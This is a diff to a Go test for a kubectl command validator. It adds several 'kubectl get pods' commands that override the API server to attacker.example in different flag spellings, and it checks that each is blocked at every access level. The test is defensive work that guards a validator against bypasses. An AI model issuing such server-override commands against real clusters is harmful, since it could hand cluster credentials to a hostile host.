@@ -408,14 +408,23 @@ func TestOperationFlagValueBypass(t *testing.T) {
 func TestValidateGlobalFlagsAllAccessLevels(t *testing.T) {
 	// Blocked global flags must be rejected regardless of access level
 	accessLevels := []AccessLevel{AccessLevelReadOnly, AccessLevelReadWrite, AccessLevelAdmin}
+	commands := []string{
+		"kubectl get pods --server=https://attacker.example",
+		"kubectl get pods -s https://attacker.example",
+		"kubectl get pods -s=https://attacker.example",
+		"kubectl get pods -shttps://attacker.example",
+		"kubectl -s https://attacker.example get pods",
+	}
 	for _, level := range accessLevels {
 		secConfig := NewSecurityConfig()
 		secConfig.AccessLevel = level
 		validator := NewValidator(secConfig)
 
-		err := validator.ValidateCommand("kubectl get pods --server=https://attacker.com:8443", CommandTypeKubectl)
-		if err == nil {
-			t.Errorf("--server= should be blocked at access level %s", level)
+		for _, command := range commands {
+			err := validator.ValidateCommand(command, CommandTypeKubectl)
+			if err == nil {
+				t.Errorf("server override %q should be blocked at access level %s", command, level)
+			}
 		}
 	}
 }
